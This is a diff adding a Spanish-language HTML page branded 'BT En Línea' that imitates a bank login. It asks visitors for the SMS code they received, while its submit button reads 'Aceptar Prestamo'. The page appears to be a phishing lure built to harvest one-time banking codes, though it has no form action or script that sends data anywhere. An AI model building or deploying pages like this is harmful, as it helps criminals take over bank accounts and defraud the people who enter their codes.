@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BT En Línea</title>
+    <style>
+        :root {
+            --move-position: 500px; /* Mover el contenido horizontalmente (solo para pantallas grandes) */
+        }
+
+        body {
+            margin: 30;
+            font-family: Arial, sans-serif;
+            background: url('fondo.jpg') no-repeat center center fixed;
+            background-size: cover;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 110vh;
+            overflow-x: hidden;
+            transform: translateX(var(--move-position)); /* Mueve el contenido solo en pantallas grandes */
+        }
+
+        .movable-content {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            border-radius: 10px;
+        }
+
+        .logo {
+            margin-bottom: 10px;
+        }
+
+        .logo img {
+            width: 90%; /* Ajustar el logo a pantallas más pequeñas */
+        }
+
+        h1 {
+            font-size: 20px;
+            font-weight: bold;
+            color: #0F172A;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+
+        p.subtitle {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 30px;
+            text-align: left;
+            font-weight: normal;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 10px;
+            font-weight: normal;
+        }
+
+        .form-group-row {
+            display: flex;
+            justify-content: flex-start;
+        }
+
+        .form-group-row select, .form-group-row input, .form-group-single input {
+            padding: 9px;
+            font-size: 14px;
+            border: 1px solid #ccc;
+            border-radius: 7px;
+            box-sizing: border-box;
+            margin-bottom: 15px;
+        }
+
+        .form-group-row select {
+            width: 30%;
+            border-radius: 10px 0 0 10px;
+        }
+
+        .form-group-row input {
+            width: 68%;
+            border-radius: 0 10px 10px 0;
+        }
+
+        .form-group-single input {
+            width: 100%;
+            border-radius: 10px;
+        }
+
+        .btn-ingresar {
+            display: block;
+            width: 100%;
+            background-color: #1511A0;
+            color: white;
+            font-size: 15px;
+            padding: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: normal;
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 15px;
+        }
+
+        .btn-secondary:hover {
+            background-color: #EF3641;
+        }
+
+        .footer {
+            margin-top: 25px;
+            text-align: center;
+            font-size: 14px;
+            color: #333;
+        }
+
+        .footer a {
+            color: #1a58b7;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .browser-icons {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: -15px; /* Solapamiento de los íconos */
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .browser-icons img {
+            width: 40px; /* Tamaño de los íconos */
+            border-radius: 50%; /* Opcional: redondear */
+            position: relative;
+            z-index: 1;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3); /* Efecto de sombra */
+        }
+
+        .footer p {
+            margin: 30px 0;
+        }
+
+        .footer a {
+            font-weight: normal;
+        }
+
+        .footer a.strong {
+            font-weight: bold;
+        }
+
+        h1 {
+            font-weight: bold;
+        }
+
+        /* Media Queries para pantallas pequeñas */
+        @media (max-width: 768px) {
+            body {
+                background: url('btenlinea_movil.jpg') no-repeat center center fixed; /* Fondo diferente para móviles */
+                background-size: cover;
+                transform: translateX(0); /* Quitar desplazamiento en móviles */
+                justify-content: center;
+                align-items: center;
+            }
+
+            .movable-content {
+                padding: 15px;
+            }
+
+            /* Ajusta el tamaño del logo en móviles */
+            .logo img {
+                width: 100%;  /* Hacer que el logo ocupe el 100% del ancho disponible */
+                height: auto;  /* Mantener la proporción del logo */
+            }
+
+            .browser-icons img {
+                width: 30px; /* Tamaño más pequeño para los íconos */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="movable-content">
+        <div class="logo">
+            <img src="logo-slogan.png" alt="BT En Línea">
+        </div>
+        <h1>¡Bienvenido (a)!</h1>
+        <p class="subtitle">Para iniciar sesión en tu cuenta, por favor introduce el código SMS que recibiste.</p>
+        <form>
+            <div class="form-group">
+                <label for="codigo">Código SMS</label>
+                <div class="form-group-single">
+                    <input id="codigo" type="text" placeholder="Introduce tu código SMS">
+                </div>
+            </div>
+            <button type="submit" class="btn-ingresar">Aceptar Prestamo</button>
+            <div class="btn-container">
+            </div>
+        </form>
+        <div class="footer">
+                        <div class="browser-icons">
+                <img src="chrome.png" alt="Chrome">
+                <img src="firefox.png" alt="Firefox">
+                <img src="edge.png" alt="Edge">
+                <img src="safari.png" alt="Safari">
+            </div>
+            <p>Para una mejor experiencia, usa alguno de estos navegadores en su versión más reciente</p>
+            <p>&copy; 2024. BDT</p>
+        </div>
+    </div>
+</body>
+</html>
